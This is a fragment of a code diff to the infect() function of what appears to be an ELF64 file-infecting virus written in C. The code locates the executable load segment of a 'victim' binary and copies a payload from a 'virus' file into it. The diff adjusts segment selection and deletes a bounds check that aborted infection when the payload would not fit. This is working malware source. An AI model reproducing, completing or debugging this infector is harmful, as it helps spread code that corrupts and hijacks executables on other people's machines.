@@ -1360,11 +1360,11 @@ int infect(const char* fpath)
 	// 	write(1, &newline, 1);
 	// }
 
-	// I don't know why but main comes before start asm..
+	// I don't know why main comes before start asm..
 	// thus start from main, located at -(0x129 - 0xe8) in one sample
-	// changing function main to my_main solved it
+	// changing function main to my_main solved it, but it breaks code execution
+	// thus changing signature to main
 	my_memmove(pay, (void *)sig_pos, REQ_SIZE);
-
 
 
 	Elf64_Phdr* pHeader[victim_header->e_phnum];
@@ -1374,7 +1374,7 @@ int infect(const char* fpath)
 	for(int i = 0 ; i < victim_header->e_phnum ; i++) {
 		pHeader[i] = (Elf64_Phdr*)pos;
 		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
-			textseg = (Elf64_Half)i;
+			textseg = (Elf64_Half)(i-1);
 		}
 		pos += victim_header->e_phentsize;
 	}
@@ -1405,12 +1405,6 @@ int infect(const char* fpath)
 			offset = offset >> 8;
 		}
 		tmp_offset[8] = '\xff';
-	}
-
-	if( REQ_SIZE > pHeader[textseg]->p_offset - padding) {
-		close(victim_fd);
-		close(virus_fd);
-		return -1;
 	}
 
 	my_memmove(victim + padding, tmp_offset, REQ_SIZE);
